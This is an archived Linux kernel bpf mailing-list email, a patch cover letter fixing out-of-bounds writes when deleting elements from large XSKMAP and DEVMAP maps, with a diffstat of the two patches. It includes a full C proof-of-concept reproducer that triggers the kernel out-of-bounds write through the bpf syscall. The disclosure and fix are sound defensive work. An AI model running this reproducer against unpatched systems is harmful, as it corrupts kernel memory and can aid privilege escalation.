Return-Path: <bpf+bounces-44948-lists+bpf=lfdr.de@vger.kernel.org>
X-Original-To: lists+bpf@lfdr.de
Delivered-To: lists+bpf@lfdr.de
Received: from am.mirrors.kernel.org (am.mirrors.kernel.org [147.75.80.249])
	by mail.lfdr.de (Postfix) with ESMTPS id 6D9E49CDEB4
	for <lists+bpf@lfdr.de>; Fri, 15 Nov 2024 13:54:14 +0100 (CET)
Received: from smtp.subspace.kernel.org (wormhole.subspace.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by am.mirrors.kernel.org (Postfix) with ESMTPS id 233C21F24298
	for <lists+bpf@lfdr.de>; Fri, 15 Nov 2024 12:54:14 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 097C31BD4E1;
	Fri, 15 Nov 2024 12:54:01 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.b="ZGlM414j"
X-Original-To: bpf@vger.kernel.org
Received: from mgamail.intel.com (mgamail.intel.com [192.198.163.12])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 6F6001B6D1B;
	Fri, 15 Nov 2024 12:53:58 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=192.198.163.12
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1731675240; cv=none; b=dDRhJoXAs6WUfzDLeXKz6DJ8fOgSR6lh/9GH5VGcw7MeCMyfRqEp0vz0C1kF+RM/hNsC4m3k6MYeDjEo5b/3Ho48aAuVVmqZUseqVDLQ8qsP0xzh9CzUlQIbOr1FxfLGtRWZ1TkU4R8VINUjEIgqPWS3kW2i2CBcsx8hFoldurI=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1731675240; c=relaxed/simple;
	bh=FmQ9Z36su8JGdF2Pg0oHe5r6fJuAe7PGaffRn5ArjwQ=;
	h=From:To:Cc:Subject:Date:Message-Id:MIME-Version; b=odZD8USdEQVE1pONHR+CKNVWestwgHP4srnmnLwKtHOJdDsRzRvwIBE+7tBWS5h/yBk/7bDGD3Wwtsj7rEOz9GjGPeXIZn9B88yjYXCXWz3NJlMwrVvu+2incbjXew01t3S8ffP71g/zdLbwyYejk/yaSuHK0R+bO8662eUKy2M=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=intel.com; spf=pass smtp.mailfrom=intel.com; dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.b=ZGlM414j; arc=none smtp.client-ip=192.198.163.12
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=intel.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=intel.com
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
  d=intel.com; i=@intel.com; q=dns/txt; s=Intel;
  t=1731675239; x=1763211239;
  h=from:to:cc:subject:date:message-id:mime-version:
   content-transfer-encoding;
  bh=FmQ9Z36su8JGdF2Pg0oHe5r6fJuAe7PGaffRn5ArjwQ=;
  b=ZGlM414jmooIat5pVhoL/IZ5OVbZ3m6RsWISKIMBQpV8TkREfu/qD38+
   bHDYRalaU2BrqbK+RsTv1XsZOMhyNHiUcuNZFHECwS9DNyUubHkX4mJ9P
   Ik8XRpbvm12NjiuS7Esvfrhodu9k7FnDWrDsenrwbs/lbujLmoQne69ph
   GK91GgXHsbJ9ICzCgYsHjShJEWxlA+4QpRa/VE7RhxyFnbZszHUhzEJyo
   D2p7Z5WCoTzjRnCrdR/nFdbrwoNMnGIaKY8e/nvTxpvnfAadneSIE24i7
   tJhCMsz3erUKdVAu0Hcth5TwXNx0iNFioXaPrTpCMtQAr1WneRfx9nLIe
   Q==;
X-CSE-ConnectionGUID: rejdBnQaR2KVNsl4cJqJag==
X-CSE-MsgGUID: Ex3nvcw5QAaFv+YPsH8olA==
X-IronPort-AV: E=McAfee;i="6700,10204,11257"; a="35607628"
X-IronPort-AV: E=Sophos;i="6.12,156,1728975600"; 
   d="scan'208";a="35607628"
Received: from orviesa009.jf.intel.com ([10.64.159.149])
  by fmvoesa106.fm.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 15 Nov 2024 04:53:57 -0800
X-CSE-ConnectionGUID: yWzKaKa8SKqWOafSEWAdhQ==
X-CSE-MsgGUID: Ac5EO7nvSSG7IVDWl58rhw==
X-ExtLoop1: 1
X-IronPort-AV: E=Sophos;i="6.12,156,1728975600"; 
   d="scan'208";a="88555488"
Received: from boxer.igk.intel.com ([10.102.20.173])
  by orviesa009.jf.intel.com with ESMTP; 15 Nov 2024 04:53:55 -0800
From: Maciej Fijalkowski <maciej.fijalkowski@intel.com>
To: bpf@vger.kernel.org,
	ast@kernel.org,
	daniel@iogearbox.net,
	andrii@kernel.org
Cc: netdev@vger.kernel.org,
	magnus.karlsson@intel.com,
	bjorn@kernel.org,
	maciej.fijalkowski@intel.com,
	jordyzomer@google.com,
	security@kernel.org
Subject: [PATCH bpf 0/2] bpf: fix OOB accesses in map_delete_elem callbacks
Date: Fri, 15 Nov 2024 13:53:46 +0100
Message-Id: <20241115125348.654145-1-maciej.fijalkowski@intel.com>
X-Mailer: git-send-email 2.38.1
Precedence: bulk
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi,

Jordy reported that for big enough XSKMAPs and DEVMAPs, when deleting
elements, OOB writes occur.

Reproducer below:

// compile with gcc -o map_poc map_poc.c -lbpf
#include <errno.h>
#include <linux/bpf.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>


int main() {
  // Create a large enough BPF XSK map
  int map_fd;
  union bpf_attr create_attr = {
      .map_type = BPF_MAP_TYPE_XSKMAP,
      .key_size = sizeof(int),
      .value_size = sizeof(int),
      .max_entries = 0x80000000 + 2,
  };

  map_fd = syscall(SYS_bpf, BPF_MAP_CREATE, &create_attr, sizeof(create_attr));
  if (map_fd < 0) {
    fprintf(stderr, "Failed to create BPF map: %s\n", strerror(errno));
    return 1;
  }


  // Delete an element from the map using syscall
  unsigned int key = 0x80000000 + 1;
  if (syscall(SYS_bpf, BPF_MAP_DELETE_ELEM,
              &(union bpf_attr){
                  .map_fd = map_fd,
                  .key = &key,
              },
              sizeof(union bpf_attr)) < 0) {
    fprintf(stderr, "Failed to delete element from BPF map: %s\n",
            strerror(errno));
    return 1;
  }

  close(map_fd);
  return 0;
}

This tiny series changes data types from int to u32 of keys being used
for map accesses.

Thanks,
Maciej

Maciej Fijalkowski (2):
  xsk: fix OOB map writes when deleting elements
  bpf: fix OOB devmap writes when deleting elements

 kernel/bpf/devmap.c | 6 +++---
 net/xdp/xskmap.c    | 2 +-
 2 files changed, 4 insertions(+), 4 deletions(-)

-- 
2.34.1


